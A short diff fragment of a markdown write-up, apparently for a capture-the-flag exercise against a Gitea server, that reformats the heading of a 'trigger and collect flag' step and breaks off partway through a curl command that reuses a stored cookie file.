@@ -341,9 +341,7 @@ SHA=$(echo "$PR" | python3 -c "import sys,json; print(json.load(sys.stdin)['head
 echo "PR=$PRNUM SHA=$SHA"
 ```
 
-**3.24 — trigger + collect flag**
-
-bash
+### Trigger + collect flag
 
 ```bash
 curl -s --negotiate -u : -b /tmp/gitea_cookies.txt \
